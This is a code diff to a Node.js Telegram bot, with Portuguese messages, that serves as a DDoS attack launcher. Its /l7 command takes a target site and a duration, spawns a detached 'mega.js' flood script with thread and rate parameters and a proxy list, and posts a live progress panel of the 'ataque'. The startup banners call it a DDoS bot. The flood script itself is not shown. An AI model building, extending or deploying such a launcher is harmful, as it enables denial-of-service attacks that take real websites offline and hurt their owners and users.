@@ -4,9 +4,10 @@ const os = require('os');
 const fs = require('fs');
 const https = require('https');
 const http = require('http');
+const path = require('path');
 
 
-const BOT_TOKEN = 'seutokenaq';
+const BOT_TOKEN = 'tokenaq';
 
 const bot = new Telegraf(BOT_TOKEN);
 
@@ -71,7 +72,6 @@ async function iniciarPainelAtaque(ctx, alvo, tempo, msgId) {
     const startTime = Date.now();
     const ipAlvo = await resolverIP(alvo);
     
-    
     const loop = setInterval(async () => {
         const decorrido = Math.floor((Date.now() - startTime) / 1000);
         const restante = Math.max(0, tempo - decorrido);
@@ -92,9 +92,7 @@ async function iniciarPainelAtaque(ctx, alvo, tempo, msgId) {
         
         try {
             await ctx.telegram.editMessageText(chatId, msgId, null, texto, { parse_mode: 'HTML' });
-        } catch (err) {
-            
-        }
+        } catch (err) {}
         
         if (restante <= 0) {
             clearInterval(loop);
@@ -106,11 +104,11 @@ async function iniciarPainelAtaque(ctx, alvo, tempo, msgId) {
 }
 
 
-bot.command('attack', async (ctx) => {
+bot.command('l7', async (ctx) => {
     try {
         const args = ctx.message.text.split(' ');
         if (args.length < 3) {
-            return ctx.reply('⚠️ Uso correto: /attack site.com 120');
+            return ctx.reply('⚠️ Uso correto: /l7 site.com 120');
         }
         
         const alvo = args[1];
@@ -121,34 +119,30 @@ bot.command('attack', async (ctx) => {
         }
         
         
-        if (!fs.existsSync('./mega')) {
+        if (!fs.existsSync('./mega.js')) {
             return ctx.reply('❌ Erro: O arquivo mega.js não foi encontrado nesta pasta.');
         }
-        
         
         if (!fs.existsSync('./proxy.txt')) {
             fs.writeFileSync('./proxy.txt', '');
         }
         
         
-        const scriptPath = require('path').resolve('./');
-        const proxyPath = require('path').resolve('./proxy.txt');
-        const comandoArgs = [scriptPath, alvo, tempo.toString(), '2', '1', proxyPath];
+        const comandoArgs = ['mega.js', alvo, tempo.toString(), '15', '5', 'proxy.txt'];
         
         console.log('▶️ Executando: node ' + comandoArgs.join(' '));
         
         
         const proc = spawn('node', comandoArgs, {
+            cwd: path.resolve('./'),
             stdio: 'ignore',
             detached: true
         });
         proc.unref();
         
-        
         const msg = await ctx.replyWithHTML(
             `⏳ <b>Iniciando ataque contra</b> <code>${alvo}</code>...\nAguarde o painel de progresso.`
         );
-        
         
         iniciarPainelAtaque(ctx, alvo, tempo, msg.message_id);
         
@@ -168,7 +162,6 @@ bot.command('st', async (ctx) => {
         const freeMem = os.freemem();
         const usedMem = totalMem - freeMem;
         const memPct = ((usedMem / totalMem) * 100).toFixed(1);
-        
         
         exec("df -k / | tail -1 | awk '{print $2, $3, $4, $5}'", (err, stdout) => {
             let discoTotal = 0, discoUsado = 0, discoPct = 0;
@@ -203,7 +196,7 @@ bot.command('st', async (ctx) => {
 
 bot.launch().then(() => {
     console.log('=======================================');
-    console.log('🤖 bot ddos free');
+    console.log('🤖 BOT DE ATAQUE AR ONLINE');
     console.log('=======================================');
     console.log('Comandos:');
     console.log('/attack site.com 120');
